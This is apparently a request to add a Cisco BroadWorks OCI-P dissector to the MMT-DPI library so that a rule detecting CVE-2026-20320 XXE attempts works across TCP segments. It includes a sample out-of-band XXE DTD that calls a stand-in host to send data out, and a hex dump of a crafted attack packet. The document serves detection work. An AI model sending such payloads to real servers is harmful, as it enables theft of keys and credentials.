# MMT-DPI request: ocip ocip.has_dtd, ocip.dtd, ocip.command_type, ocip.session_id for mmt-security rule 231

**Requested by:** mmt-security rule `231.broadworks_oci_xxe` (Cisco BroadWorks OCI-P XXE, CVE-2026-20320, initial access of "Operation Snowball")
**MMT-DPI version checked:** `/* This code is generated automatically on 2026-01-29 23:08:49 using MMT-DPI v1.7.10 (fd93012d). */` (installed library: libmmt_core 1.10.2)
**Status in mmt-security:** rule shipped with workaround (bounded byte scan of `tcp.p_payload` for `<!DOCTYPE` on TCP destination port 2208, ASCII/UTF-16, plus `processOCIMessage` ... `!DOCTYPE` for OCI over SOAP)

## Why

CVE-2026-20320 is an unauthenticated, out-of-band blind XXE in the BroadWorks Open Client Interface XML parser: a crafted OCI-P message with a DTD that declares an external entity makes the server read local files (keys, credentials) or fetch an attacker URL. It was the entry point of Operation Snowball (Malbear Labs, 8 Nov 2026) and is in CISA KEV (10 Nov 2026). MMT-DPI does not know OCI-P, so the rule scans raw TCP payload per packet: it misses a `<!DOCTYPE` split across TCP segments (verified: 0 alerts on `attack_v7_split.pcap`), depends on a fixed port, and cannot tell an OCI-P message from other XML on that port.

## Protocol

- Name / spec: Cisco BroadWorks Open Client Interface - Provisioning (OCI-P). Spec: "BroadWorks Application Server Provisioning Interface Specification" (Cisco, e.g. http://www.sandelman.ca/tmp/broadworks/BW-ASProvisioningInterfaceSpec-R210.pdf); wire format as implemented by https://github.com/lukebeer/broadworks-ocip (`src/BroadworksOCIP/Builder/Builder.php`, `Client/Transport/TCPTransport.php`).
- Transport and ports: TCP, default 2208 (cleartext), 2209 (OCI over TLS); also OCI over SOAP on HTTP(S) (`processOCIMessage` SOAP operation, OCI document HTML-escaped in `<arg0>`).
- Message framing (TCP): each message is one XML document `<?xml ...?><BroadsoftDocument protocol="OCI" xmlns="C" ...><sessionId>..</sessionId><command xsi:type="<Name>">...</command></BroadsoftDocument>` terminated by `\n`; a message can span several TCP segments, so the dissector must reassemble per direction up to `</BroadsoftDocument>` / newline.
- Current DPI support: unknown protocol (traffic on 2208 is TCP only; only generic `tcp.p_payload` is available).

## Requested attributes

| Attribute | MMT data type | Message(s) carrying it | Location / parsing rule | Example values |
|---|---|---|---|---|
| `ocip.has_dtd` | `MMT_U8_DATA` | every OCI-P document (client and server) | 1 when the XML prolog (bytes before the root element `BroadsoftDocument`) contains a `<!DOCTYPE` declaration, after decoding UTF-8/UTF-16 per the BOM/encoding declaration; else 0 | `1` (attack), `0` (benign) |
| `ocip.dtd` | `MMT_STRING_DATA` | same | text of the `<!DOCTYPE ... >` declaration (including the internal subset `[...]`), truncated to the string limit | `<!DOCTYPE BroadsoftDocument [<!ENTITY % ext SYSTEM "http://203.0.113.50:8000/oci.dtd"> %ext; %send;]>` |
| `ocip.command_type` | `MMT_STRING_DATA` | every OCI-P document | value of the `xsi:type` attribute of `<command>` | `AuthenticationRequest`, `LoginRequest22V5`, `UserGetRequest22`, `c:ErrorResponse` |
| `ocip.session_id` | `MMT_STRING_DATA` | every OCI-P document | text of `<sessionId>` | `a1b2c3d4e5f6`, `&xxe;` (attack V1) |

## Evidence

- pcap: `check/pcap/231.broadworks_oci_xxe.pcap` (SHA-256 `a4b1b05ee88ffb80d2e9bd07ec348fe813d6eb469a7f3487a3ced3ea8ecb8560`), crafted with `check/lab/231.broadworks_oci_xxe/gen_pcaps.py`; more variants in `check/lab/231.broadworks_oci_xxe/pcaps/` (benign session: `benign_ocip.pcap`; segmentation: `attack_v7_split.pcap`; UTF-16: `attack_v6_utf16.pcap`).
- Packets: frame 4 (198.51.100.23 -> 192.0.2.10:2208, 385 bytes) - `tshark -r check/pcap/231.broadworks_oci_xxe.pcap -Y 'tcp.dstport==2208 && tcp.len>0' -x` excerpt:

```
0030  20 00 1c 22 00 00 3c 3f 78 6d 6c 20 76 65 72 73    .."..<?xml vers
0040  69 6f 6e 3d 22 31 2e 30 22 20 65 6e 63 6f 64 69   ion="1.0" encodi
0050  6e 67 3d 22 55 54 46 2d 38 22 3f 3e 3c 21 44 4f   ng="UTF-8"?><!DO
0060  43 54 59 50 45 20 42 72 6f 61 64 73 6f 66 74 44   CTYPE BroadsoftD
0070  6f 63 75 6d 65 6e 74 20 5b 3c 21 45 4e 54 49 54   ocument [<!ENTIT
0080  59 20 25 20 65 78 74 20 53 59 53 54 45 4d 20 22   Y % ext SYSTEM "
0090  68 74 74 70 3a 2f 2f 32 30 33 2e 30 2e 31 31 33   http://203.0.113
```

Expected values for frame 4: `ocip.has_dtd = 1`, `ocip.command_type = AuthenticationRequest`, `ocip.session_id = a1b2c3d4e5f6`, `ocip.dtd` starting `<!DOCTYPE BroadsoftDocument [<!ENTITY % ext SYSTEM`. In `benign_ocip.pcap` every OCI-P message has `ocip.has_dtd = 0`.

## Intended rule

Grammar check: this draft, with `ocip.has_dtd` replaced by `tcp.src_port` and `ocip.command_type` by `http.uri`, gave `PASS compile` and `PASS lint` with `scripts/test_rule.sh --id 231`.

```xml
<beginning>
<property value="THEN" delay_units="s" delay_min="0" delay_max="0" property_id="231" type_property="ATTACK"
    description="Cisco BroadWorks OCI-P XXE attempt (CVE-2026-20320): DTD in an OCI-P message">
    <event value="COMPUTE" event_id="1" description="OCI-P request whose XML prolog declares a DTD"
           boolean_expression="((ocip.has_dtd == 1)&amp;&amp;(ocip.command_type != ''))"/>
    <event value="COMPUTE" event_id="2" description="Print IP source and destination addresses"
           boolean_expression="(ip.src != ip.dst)"/>
</property>
</beginning>
```

## Acceptance check

With the new MMT-DPI installed and `make gen_dpi` run in mmt-security:

```bash
skills/mmt-rule-generator/scripts/probe_attrs.sh check/pcap/231.broadworks_oci_xxe.pcap ocip.has_dtd ocip.dtd ocip.command_type ocip.session_id
skills/mmt-rule-generator/scripts/probe_attrs.sh check/lab/231.broadworks_oci_xxe/pcaps/attack_v7_split.pcap ocip.has_dtd
```

reports a count > 0 for every attribute, with the example values above (`ocip.has_dtd` = 1 also on the split-segment pcap, i.e. after reassembly).
